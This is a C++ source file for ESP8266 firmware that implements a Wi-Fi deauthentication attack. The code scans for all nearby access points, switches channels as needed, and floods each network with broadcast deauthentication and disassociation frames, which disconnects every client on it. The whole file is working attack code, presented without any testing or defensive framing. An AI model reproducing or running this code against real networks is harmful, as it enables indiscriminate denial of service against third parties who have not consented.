#include "Deauth.h"

Deauth::Deauth() {
  ap_list = new SimpleList<AccessPoint>;
}

void Deauth::startDeauthAll() {
    startScan();
    uint16_t packetSize = sizeof(deauthPacket);
    const uint8_t broadcast[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
    uint8_t curr_channel = 0;
    for (int i = 0; i < ap_list->size(); i++)
    {
      memcpy(&deauthPacket[4], broadcast, 6);
      memcpy(&deauthPacket[10], ap_list->get(i).BSSID, 6);
      memcpy(&deauthPacket[16], ap_list->get(i).BSSID, 6);
      deauthPacket[0] = 0xc0;

      if ((ap_list->get(i).channel != curr_channel) && (ap_list->get(i).channel > 0) && (ap_list->get(i).channel < 15)) {
        curr_channel = ap_list->get(i).channel;
        wifi_set_channel(curr_channel);
      }

      for (int j = 0; j < 25; j++)
      {
        Serial.println("Send deauth frame to " + ap_list->get(i).ssid);
        bool sent = wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == 0;
        while (sent == false) {
          sent = wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == 0;
          yield();
        }

        Serial.println("Send disassociate frame to " + ap_list->get(i).ssid);
        sent = false;
        deauthPacket[0] = 0xa0;
        sent = wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == 0;
        while (sent == false) {
          sent = wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == 0;
          yield();
        }
      }
    }
}

void Deauth::startScan() {
  WiFi.scanDelete();
  ap_list->clear();
  int found = WiFi.scanNetworks(false, true);
  for (int i = 0; i < found; i++)
  {
    AccessPoint ap;
    WiFi.getNetworkInfo(i, ap.ssid, ap.encryptionType, ap.RSSI, ap.BSSID, ap.channel, ap.isHidden);
    ap.s_bssid = WiFi.BSSIDstr(i);

    //Print found APs
    Serial.printf("%d: %s, Ch:%d (%ddBm) %s %s %s\n", i + 1, ap.ssid.c_str(), ap.channel, ap.RSSI, ap.encryptionType == ENC_TYPE_NONE ? "open" : "", ap.isHidden ? "hidden" : "", ap.s_bssid.c_str());
    ap_list->add(ap);
  }
}
